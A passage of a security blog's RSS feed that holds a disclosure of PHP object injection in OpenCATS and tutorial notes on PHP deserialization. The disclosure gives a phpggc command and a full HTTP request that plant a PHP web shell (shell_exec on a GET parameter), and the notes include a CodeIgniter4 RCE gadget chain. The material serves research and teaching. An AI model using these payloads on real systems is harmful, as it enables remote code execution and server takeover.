        <link>http://snoopysecurity.github.io/web-application-security/2021/04/14/09_adempierie_java_deserialization.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/web-application-security/2021/04/14/09_adempierie_java_deserialization.html</guid>
        
        
        <category>web-application-security</category>
        
      </item>
    
      <item>
        <title>OpenCATS PHP Object Injection to Arbitrary File Write</title>
        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;OpenCATS is an application tracking system that is written in PHP. More about OpenCATS can be seen here: &lt;a href=&quot;https://www.opencats.org/&quot;&gt;https://www.opencats.org/&lt;/a&gt;. OpenCATS is vulnerable to PHP Object injection, by leveraging this vulnerability, it is possible to conduct arbitrary file write and execute arbitrary code on a system.&lt;/p&gt;

&lt;h2 id=&quot;technical-details&quot;&gt;Technical Details&lt;/h2&gt;

&lt;p&gt;OpenCATS has an activity area to keep track of activities.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/opencats/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following request is being sent to the application as part of a normal application workflow.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/opencats/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;parametersactivity:ActivityDataGrid&lt;/code&gt; parameter is sending serialized data as seen below which is being deserialized by the application using the &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; function.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a:9:{s:10:&quot;rangeStart&quot;;i:0;s:10:&quot;maxResults&quot;;i:15;s:13:&quot;filterVisible&quot;;b:0;s:9:&quot;startDate&quot;;s:0:&quot;&quot;;s:7:&quot;endDate&quot;;s:0:&quot;&quot;;s:6:&quot;period&quot;;s:37:&quot;DATE_SUB(CURDATE(), INTERVAL 1 MONTH)&quot;;s:6:&quot;sortBy&quot;;s:15:&quot;dateCreatedSort&quot;;s:13:&quot;sortDirection&quot;;s:4:&quot;DESC&quot;;s:11:&quot;filterAlpha&quot;;s:1:&quot;L&quot;;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; function can be seen in &lt;code class=&quot;highlighter-rouge&quot;&gt;DataGrid.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/opencats/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/opencats/OpenCATS/blob/develop/lib/DataGrid.php#L272&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;To exploit with vulnerability, a POP gadget chain can be created using &lt;code class=&quot;highlighter-rouge&quot;&gt;guzzlehttp&lt;/code&gt;. A &lt;code class=&quot;highlighter-rouge&quot;&gt;__destruct&lt;/code&gt; magic method available within &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/public/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php&lt;/code&gt; can be leveraged to write arbitrary files to the system.&lt;/p&gt;

&lt;p&gt;The relevant code that needs to be triggered can be seen below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    public function __destruct()
    {
        $this-&amp;gt;save($this-&amp;gt;filename);
    }

    /**
     * Saves the cookies to a file.
     *
     * @param string $filename File to save
     * @throws \RuntimeException if the file cannot be found or created
     */
    public function save($filename)
    {
        $json = [];
        foreach ($this as $cookie) {
            /** @var SetCookie $cookie */
            if (CookieJar::shouldPersist($cookie, $this-&amp;gt;storeSessionCookies)) {
                $json[] = $cookie-&amp;gt;toArray();
            }
        }

        $jsonStr = \GuzzleHttp\json_encode($json);
        if (false === file_put_contents($filename, $jsonStr)) {
            throw new \RuntimeException(&quot;Unable to save file {$filename}&quot;);
        }
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;In the above example, the &lt;code class=&quot;highlighter-rouge&quot;&gt;destruct()&lt;/code&gt; magic method calls the &lt;code class=&quot;highlighter-rouge&quot;&gt;save()&lt;/code&gt; method on the FileCookieJar class. The &lt;code class=&quot;highlighter-rouge&quot;&gt;save&lt;/code&gt; method take a value called &lt;code class=&quot;highlighter-rouge&quot;&gt;filename&lt;/code&gt; which is a property of an object, The contents of th is file comes from the &lt;code class=&quot;highlighter-rouge&quot;&gt;$json&lt;/code&gt; array which get the value from &lt;code class=&quot;highlighter-rouge&quot;&gt;$cookie-&amp;gt;toArray()&lt;/code&gt;, and $cookie being an object.&lt;/p&gt;

&lt;p&gt;Multiple checks are also done to ensure that &lt;code class=&quot;highlighter-rouge&quot;&gt;$cookie-&amp;gt;getExpires()&lt;/code&gt; returns true and &lt;code class=&quot;highlighter-rouge&quot;&gt;$cookie-&amp;gt;getDiscard()&lt;/code&gt; returns false. After these checks, The &lt;code class=&quot;highlighter-rouge&quot;&gt;$json&lt;/code&gt; array is then json encoded and written to a file using the &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;This is an already known gadget found by &lt;code class=&quot;highlighter-rouge&quot;&gt;cf&lt;/code&gt; which is available within &lt;code class=&quot;highlighter-rouge&quot;&gt;Guzzle&lt;/code&gt; versions 6.0.0 &amp;lt;= 6.3.3+&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ambionics/phpggc&quot;&gt;phpggc&lt;/a&gt; can be used to generate a serialized exploit payload for this gadget&lt;/p&gt;

&lt;p&gt;A payload such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php echo shell_exec($_GET['e'].' 2&amp;gt;&amp;amp;1'); ?&amp;gt;&lt;/code&gt; can now be used with phpggc to generate a serialized gadget chain which will store &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.php&lt;/code&gt; within &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/public/shell.php&lt;/code&gt; of the target OpenCAT system.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;üíª  üìÇ  üç£ master ‚ùØ ./phpggc -u --fast-destruct Guzzle/FW1 /var/www/public/shell.php  /tmp/shell.php 
a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fvar%2Fwww%2Fpublic%2Fshell.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A45%3A%22%3C%3Fphp+echo+shell_exec%28%24_GET%5B%27e%27%5D.%27+2%3E%261%27%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The request with the payload can now be sent.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /index.php?m=activity&amp;amp;parametersactivity%3AActivityDataGrid=a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fvar%2Fwww%2Fpublic%2Fshell.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A45%3A%22%3C%3Fphp+echo+shell_exec%28%24_GET%5B%27e%27%5D.%27+2%3E%261%27%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3B%7Di%3A7%3Bi%3A7%3B%7D HTTP/1.12
Host: dvws.local
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://dvws.local/index.php?m=activity
Cookie: _pc_tvs=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDkzNjMwNTYsInB0ZyI6eyJjbWY6c2ciOnsiODYwIjoxLCIxMDA3IjoxfSwiX2MiOjE2MDkzNTgwMjEsIl91IjoxNjA5MzU5MzI3fSwiZXhwIjoxNjQwODk5MDU2fQ.OFq8osGBuTAJUengo4LZey2wBuonlgwGBvwJ327pHbQ; _pc_vis=da58a38788948fae; _ga=GA1.2.1963052574.1609358122; sugar_user_theme=SuiteP; ck_login_id_20=1; ck_login_language_20=en_us; EmailGridWidths=0=10&amp;amp;1=10&amp;amp;2=150&amp;amp;3=250&amp;amp;4=175&amp;amp;5=125; Users_divs=Users_aclroles_v%3Dtrue%23undefined%3D%23; ProspectLists_divs=ProspectLists_contacts_v%3Dtrue%23undefined%3D%23ProspectLists_prospects_v%3Dtrue%23; CATS=0cf6e6265f75d23a9abbcf8d70091118
Upgrade-Insecure-Requests: 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;shell.php&lt;/code&gt; can now be leveraged to execute arbitrary code.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/opencats/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:Multiple other areas within OpenCATs are also taking deserialized user input which can be leveraged for the same vulnerability. Also, Multiple Cross-site Scripting (XSS) issues also exist on this codebase.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/opencats/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I‚Äôve opened a GitHub issue to report this &lt;a href=&quot;https://github.com/opencats/OpenCATS/issues/515&quot;&gt;issue&lt;/a&gt; and CVE has assigned two CVEs as well: CVE-2021-25294 and CVE-2021-25295&lt;/p&gt;

</description>
        <pubDate>Sat, 16 Jan 2021 09:00:00 +0000</pubDate>
        <link>http://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html</guid>
        
        
        <category>web-application-security</category>
        
      </item>
    
      <item>
        <title>PHP Object Injection Exploitation Notes</title>
        <description>&lt;p&gt;&lt;em&gt;Notes I‚Äôve written and Collected about PHP Deserialization&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;h2 id=&quot;serialize-and-unserialize&quot;&gt;serialize and unserialize&lt;/h2&gt;

&lt;p&gt;Serialization functions are commonly used within software to store data to a file, a memory buffer, or transmitted across to another network which can then be deserialized at a later date. Within PHP, The &lt;a href=&quot;https://www.php.net/manual/en/function.serialize.php&quot;&gt;serialize()&lt;/a&gt; function can be used to convert a value to an serialized object. This function can be used to convert a value/object to a serialized value. An example of this can be seen below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
class Test
{
    public $name = &quot;Snoopy&quot;;
    public $age = 0.1;
    public $secret = 0;
    public $hobbies = array(&quot;bughunting&quot;, &quot;softwaresecurity&quot;);
    public $bug_hunter = True;
}

$object = new Test();
$serialized = serialize($object);
echo $serialized;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The serialized form of the above object can be seen as&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:4:&quot;Test&quot;:5:{s:4:&quot;name&quot;;s:6:&quot;Snoopy&quot;;s:3:&quot;age&quot;;d:0.1;s:6:&quot;secret&quot;;i:0;s:7:&quot;hobbies&quot;;a:2:{i:0;s:10:&quot;bughunting&quot;;i:1;s:16:&quot;softwaresecurity&quot;;}s:10:&quot;bug_hunter&quot;;b:1;}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This structure can be understood as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;O:Length of Object name :‚ÄùClass Name‚Äù:Number of Properties in Class:{Properties}&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;O:4:&quot;Test&quot;:5&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;{ data }&lt;/strong&gt; - Denotes the data structure of the object with the 5 properties - &lt;code class=&quot;highlighter-rouge&quot;&gt;$name, $age, $secret, $hobbies, $bug_hunter&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;s:Length of the String:‚ÄùString Value‚Äù;&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;s:4:&quot;name&quot;;s:6:&quot;Snoopy&quot;;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;d:Float;&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;s:3:&quot;age&quot;;d:0.1;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;i:Integer;&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;s:6:&quot;secret&quot;;i:0;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;a:Number of Elements:{Elements}&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;a:2:{i:0;s:10:&quot;bughunting&quot;;i:1;s:16:&quot;softwaresecurity&quot;;}&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;b:boolean;&lt;/strong&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;s:10:&quot;bug_hunter&quot;;b:1;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This can be converted back to an object from using the &lt;a href=&quot;https://www.php.net/manual/en/function.unserialize.php&quot;&gt;unserialize()&lt;/a&gt; function. &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; has two parameters:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unserialize ( string $data , array $options = [] ) : mixed
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;$data&lt;/code&gt; parameter takes a serialized string that can be deserialized&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;$options&lt;/code&gt; array can be used to specify &lt;code class=&quot;highlighter-rouge&quot;&gt;allowed_classes&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;allowed_classes&lt;/code&gt; can be used to whitelist class names that should be accepted. If this is used and  &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize()&lt;/code&gt; encounters an object of a class that isn‚Äôt to be accepted, then the object will be instantiated as a &lt;code class=&quot;highlighter-rouge&quot;&gt;__PHP_Incomplete_Class&lt;/code&gt; instead.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php

$object = 'O:4:&quot;Test&quot;:5:{s:4:&quot;name&quot;;s:6:&quot;Snoopy&quot;;s:3:&quot;age&quot;;d:0.1;s:6:&quot;secret&quot;;i:0;s:7:&quot;hobbies&quot;;a:2:{i:0;s:10:&quot;bughunting&quot;;i:1;s:16:&quot;softwaresecurity&quot;;}s:10:&quot;bug_hunter&quot;;b:1;}';
$unserialized = unserialize(var_dump($object));
echo $unserialized;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;During deserialization, &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; will take the user input, this input will have some objects along with the class and the properties of that object, and will create an instance of the provided class and object in memory (Object Instantiation) and creates a copy of the originally serialized object. As per PHP documentation, after successfully reconstructing the object, PHP will automatically attempt to call the the  &lt;code class=&quot;highlighter-rouge&quot;&gt;__wakeup()&lt;/code&gt; magic method as well (if one exists) and execute code in that function if it is defined for the class. This function can reconstruct any resources that the object may have. The intended use of &lt;code class=&quot;highlighter-rouge&quot;&gt;__wakeup()&lt;/code&gt; is to reestablish any database connections that may have been lost during serialization and perform other reinitialization tasks. Once this is done, then the &lt;code class=&quot;highlighter-rouge&quot;&gt;__destruct()&lt;/code&gt; magic method of that class will be called to when no reference to the deserialized object instance exists.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;serialize()&lt;/code&gt; will save all properties in the object and the class the object belongs to during serialization but no methods of the class of the object will be stored.
As such, when &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; is triggered, the class of the object will have to be defined in advance in code (definition of the class needs to be present in the file unserialize() is called in), or through autoloading. If the class is not already defined in the file, the object will be instantiated as &lt;code class=&quot;highlighter-rouge&quot;&gt;__PHP_Incomplete_Class&lt;/code&gt;, which has no methods.&lt;/p&gt;

&lt;h2 id=&quot;object-injection&quot;&gt;Object Injection&lt;/h2&gt;

&lt;p&gt;PHP Object Injection/Unserialization happens when untrusted user input is being executed by the &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; function which can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this.&lt;/p&gt;

&lt;p&gt;This was initially made public by Stefan Esser&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf&quot;&gt;https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf&quot;&gt;https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://wiki.php.net/rfc/secure_unserialize&quot;&gt;https://wiki.php.net/rfc/secure_unserialize&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;requirements-for-a-successful-exploit&quot;&gt;Requirements for a Successful Exploit&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;PHP Magic Methods - The codebase/application being exploited needs to have interesting magic methods that can then be triggered through a POP chain.&lt;/li&gt;
  &lt;li&gt;The POP gadget chain/object being called must be declared during when &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize&lt;/code&gt; is being called ( &lt;code class=&quot;highlighter-rouge&quot;&gt;include()&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;require()&lt;/code&gt;) or &lt;a href=&quot;https://www.php.net/manual/en/language.oop5.autoload.php&quot;&gt;object autoloading&lt;/a&gt; (through composer (&lt;code class=&quot;highlighter-rouge&quot;&gt;require __DIR__ . '/vendor/autoload.php';&lt;/code&gt;) or generic autoloading) must be supported for the target classes when &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize()&lt;/code&gt; is being executed&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;php-magic-methods&quot;&gt;PHP Magic Methods&lt;/h3&gt;

&lt;p&gt;PHP Magic Methods are PHP classes that have magical properties in PHP. You cannot have functions with these names in any of your classes unless you want the magic functionality associated with them. More about this can be read from here: &lt;a href=&quot;https://www.php.net/manual/en/language.oop5.magic.php&quot;&gt;PHP Magic Methods Documentation&lt;/a&gt;. During exploitation, these magic methods can be invoked by crafting a PHP POP gadget. This is because these methods are executed automatically when &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize()&lt;/code&gt; is called on an object.&lt;/p&gt;

&lt;h4 id=&quot;magic-methods-most-useful-for-exploitation&quot;&gt;Magic Methods most useful for exploitation&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__toString()&lt;/code&gt; - Invoked when object is converted to a string. (by &lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt; for example)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__destruct()&lt;/code&gt; - Invoked when an object is deleted. When no reference to the deserialized object instance exists, __destruct() is called.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__wakeup()&lt;/code&gt;	- Invoked when an object is unserialized. automatically called upon object deserialization.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__call()&lt;/code&gt; - will be called if the object will ca1ll an inexistent function&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;magic-methods-that-could-be-useful-for-exploitation-not-useful-in-most-cases&quot;&gt;Magic Methods that could be useful for exploitation (Not useful in Most Cases)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__set()&lt;/code&gt; - called if the object try to access inexistent class variables&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__isset()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__invoke()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__unset()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__set_state()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__callStatic()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__sleep()&lt;/code&gt; - called when an object is serialized (with serialize)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__clone()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__get()&lt;/code&gt;	- called if the object try to access inexistent class variables&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__debugInfo()&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;__construct()&lt;/code&gt; - Invoked  when an object is created (constructor)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;phpgcc&quot;&gt;PHPGCC&lt;/h3&gt;

&lt;p&gt;PHPGGC is a library of &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize()&lt;/code&gt; payloads along with a command-line program. This can be used to generate POP gadgets from known libraries people have already found. PHPGGC supports gadget chains such as CodeIgniter4, Doctrine, Drupal7, Guzzle, Laravel, Magento, Monolog, Phalcon, Podio, Slim, SwiftMailer, Symfony, WordPress, Yii, and ZendFramework.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;List all gadgets&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                        TYPE             VECTOR         I    
CodeIgniter4/RCE1                         4.0.0-beta.1 &amp;lt;= 4.0.0-rc.4     rce              __destruct          
CodeIgniter4/RCE2                         4.0.0-rc.4 &amp;lt;= 4.0.4+           rce              __destruct          
Doctrine/FW1                              ?                              file_write       __toString     *    
Drupal7/FD1                               7.0 &amp;lt; ?                        file_delete      __destruct     *    
Drupal7/RCE1                              7.0.8 &amp;lt; ?                      rce              __destruct     *  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Create a POP gadget using the &lt;code class=&quot;highlighter-rouge&quot;&gt;__destruct&lt;/code&gt; vector known in versions &lt;code class=&quot;highlighter-rouge&quot;&gt;4.0.0-rc.4 &amp;lt;= 4.0.4+&lt;/code&gt;. Run the system command &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; using PHP‚Äôs &lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt; function.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./phpggc CodeIgniter4/RCE2 system id


O:39:&quot;CodeIgniter\Cache\Handlers\RedisHandler&quot;:1:{s:8:&quot;*redis&quot;;O:45:&quot;CodeIgniter\Session\Handlers\MemcachedHandler&quot;:2:{s:12:&quot;*memcached&quot;;O:17:&quot;CodeIgniter\Model&quot;:8:{s:10:&quot;*builder&quot;;O:32:&quot;CodeIgniter\Database\BaseBuilder&quot;:2:{s:6:&quot;QBFrom&quot;;a:1:{i:0;s:2:&quot;()&quot;;}s:2:&quot;db&quot;;O:38:&quot;CodeIgniter\Database\MySQLi\Connection&quot;:0:{}}s:13:&quot;*primaryKey&quot;;N;s:15:&quot;*beforeDelete&quot;;a:1:{i:0;s:8:&quot;validate&quot;;}s:18:&quot;*validationRules&quot;;a:1:{s:4:&quot;id.x&quot;;a:1:{s:5:&quot;rules&quot;;a:2:{i:0;s:6:&quot;system&quot;;i:1;s:2:&quot;dd&quot;;}}}s:13:&quot;*validation&quot;;O:33:&quot;CodeIgniter\Validation\Validation&quot;:1:{s:15:&quot;*ruleSetFiles&quot;;a:1:{i:0;s:5:&quot;finfo&quot;;}}s:21:&quot;*tempAllowCallbacks&quot;;i:1;s:2:&quot;db&quot;;O:38:&quot;CodeIgniter\Database\MySQLi\Connection&quot;:0:{}s:20:&quot;cleanValidationRules&quot;;b:0;}s:10:&quot;*lockKey&quot;;a:1:{s:1:&quot;x&quot;;s:2:&quot;id&quot;;}}}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;hunting-for-pop-gadgets&quot;&gt;Hunting For POP Gadgets&lt;/h3&gt;

&lt;p&gt;Examples of interesting functionalities to look for within Magic Methods:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Arbritary File Write - &lt;code class=&quot;highlighter-rouge&quot;&gt;@unlink($fileobject)&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;file_put_contents($this-&amp;gt;file)&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Code Execution - &lt;code class=&quot;highlighter-rouge&quot;&gt;eval($this-&amp;gt;injectobject);&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Type Juggling - &lt;code class=&quot;highlighter-rouge&quot;&gt;if ($username == $adminName &amp;amp;&amp;amp; $password == $adminPassword) {&lt;/code&gt; ( loose comparison operator ‚Äú==‚Äù, user input taken as arrays and type conversion occurs )&lt;/li&gt;
  &lt;li&gt;Authentication Bypass through Object reference - &lt;code class=&quot;highlighter-rouge&quot;&gt;if (isset($this-&amp;gt;obj)) return $this-&amp;gt;obj-&amp;gt;getValue();&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;($obj-&amp;gt;check === $obj-&amp;gt;secrethash) {echo &quot;Pass&quot;;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;SQL Injection - $sql = &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;SELECT * FROM table WHERE id = &quot; . $id;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Other Dangerous functions that might be useful to look for:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://gist.github.com/snoopysecurity/7afd189724bc02a14a7f89d9a8284b69&quot;&gt;Dangerous PHP Functions  - https://gist.github.com/snoopysecurity/7afd189724bc02a14a7f89d9a8284b69&lt;/a&gt;&lt;/li&gt;
